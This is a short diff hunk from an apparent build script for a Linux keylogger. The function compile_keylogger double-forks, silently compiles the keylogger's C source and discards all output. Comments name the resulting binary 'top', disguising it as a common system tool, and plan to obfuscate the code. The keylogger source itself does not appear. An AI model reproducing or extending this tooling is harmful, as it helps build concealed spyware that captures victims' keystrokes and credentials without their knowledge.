@@ -28,9 +28,9 @@ def compile_keylogger():
     if pid == 0:
         pid2 = fork()
         if pid2 == 0:
-            # export cls="/usr/bin/gcc linux_keylogger/src/linux_keylogger.c -o top"
+            # export cls="/usr/bin/gcc keylogger.c -o top"
             # code script to copy ove all c code on one file and obfuscate it as well
-            system("gcc linux_keylogger/src/keylogger.c -o keylogger >/dev/null 2>&1")
+            system("gcc keylogger.c -o keylogger >/dev/null 2>&1")
             exit(0)
         exit(0)
 
